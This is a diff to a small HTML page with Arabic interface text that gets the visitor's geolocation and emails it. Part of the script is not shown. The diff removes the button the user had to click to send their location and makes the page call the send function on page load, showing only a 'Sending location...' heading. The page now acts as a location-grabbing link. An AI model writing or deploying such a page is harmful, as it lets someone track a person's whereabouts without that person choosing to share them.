@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Send Location via Email</title>
+    <title>Send Location via Email Automatically</title>
     <script>
         function getLocation() {
             if (navigator.geolocation) {
@@ -37,9 +37,12 @@
                 console.error('خطأ:', error);
             });
         }
+
+        // استدعاء الدالة عند تحميل الصفحة
+        window.onload = getLocation;
     </script>
 </head>
 <body>
-    <button onclick="getLocation()">إرسال موقعي عبر البريد الإلكتروني</button>
+    <h1>جاري إرسال الموقع...</h1>
 </body>
 </html>
